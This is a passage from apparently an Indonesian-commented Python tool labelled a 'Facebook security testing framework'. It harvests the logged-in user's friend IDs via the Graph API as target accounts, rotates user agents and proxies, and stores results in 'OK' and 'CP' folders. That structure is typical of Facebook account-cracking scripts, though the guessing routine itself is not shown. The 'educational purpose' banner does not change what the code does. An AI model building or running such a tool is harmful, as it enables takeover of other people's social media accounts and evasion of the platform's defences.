                    accounts.append((acc_id.strip(), name.strip()))
        
        elif input_type == "friend_list" and self.is_authenticated:
            # Ambil friend list dari akun yang login
            try:
                friends = self.get_friend_list()
                accounts = [(f['id'], f['name']) for f in friends[:100]]  # Limit 100 friends
            except Exception as e:
                self.logger.error(f"Error mengambil friend list: {e}")
        
        return accounts
    
    def get_friend_list(self) -> List[Dict]:
        """Dapatkan friend list dari akun yang login"""
        try:
            if not self.auth.token:
                return []
            
            url = f"https://graph.facebook.com/{self.auth.user_id}/friends"
            params = {
                'access_token': self.auth.token,
                'fields': 'id,name',
                'limit': '100'
            }
            
            response = requests.get(url, params=params, timeout=30)
            
            if response.status_code == 200:
                data = response.json()
                return data.get('data', [])
            
        except Exception as e:
            self.logger.error(f"Error: {e}")
        
        return []
    
    def generate_user_agents(self):
        """Generate user agents"""
        try:
            count = int(Prompt.ask("[yellow]Jumlah user agents[/yellow]", default="100"))
            
            ua_manager = UserAgentManager()
            ua_manager.generate_agents(count)
            ua_manager.save_agents()
            
            self.logger.success(f"Berhasil generate {count} user agents")
            
        except Exception as e:
            self.logger.error(f"Error: {e}")
    
    def update_proxies(self):
        """Update proxy list"""
        try:
            self.logger.info("Mengupdate proxy list...")
            
            proxy_manager = ProxyManager()
            proxy_count = len(proxy_manager.proxies)
            
            self.logger.success(f"Berhasil mendapatkan {proxy_count} proxies")
            
        except Exception as e:
            self.logger.error(f"Error: {e}")
    
    def view_results(self):
        """View previous results"""
        try:
            # Tampilkan pilihan folder
            folders = ["OK", "CP", "results"]
            
            for folder in folders:
                if os.path.exists(folder):
                    files = os.listdir(folder)
                    if files:
                        self.ui.console.print(f"\n[bold cyan]{folder.upper()}:[/bold cyan]")
                        for file in sorted(files)[-5:]:  # Tampilkan 5 terakhir
                            file_path = os.path.join(folder, file)
                            file_size = os.path.getsize(file_path)
                            self.ui.console.print(f"  • {file} ({file_size} bytes)")
        
        except Exception as e:
            self.logger.error(f"Error: {e}")
    
    def clear_session(self):
        """Clear current session"""
        if Confirm.ask("[red]Yakin ingin menghapus session?[/red]", default=False):
            self.auth.clear_credentials()
            self.is_authenticated = False
            self.logger.success("Session berhasil dihapus")
    
    def shutdown(self):
        """Shutdown aplikasi dengan clean up"""
        self.logger.info("Shutting down aplikasi...")
        
        # Clean up temporary files
        try:
            temp_files = [".temp_", "tmp_"]
            for file in os.listdir('.'):
                if any(file.startswith(prefix) for prefix in temp_files):
                    os.remove(file)
        except:
            pass
        
        self.logger.success("Aplikasi berhenti")

# =================== ENTRY POINT ====================
if __name__ == "__main__":
    # Banner informasi
    banner = """
╔══════════════════════════════════════════════════════════╗
║       FACEBOOK SECURITY TESTING FRAMEWORK v2.0          ║
║            For Educational Purpose Only                 ║
║     Use Responsibly and Follow Ethical Guidelines      ║
╚══════════════════════════════════════════════════════════╝
    """
    
    print(banner)
    
    # Jalankan aplikasi
    app = SecurityTestingApp()
    app.run()
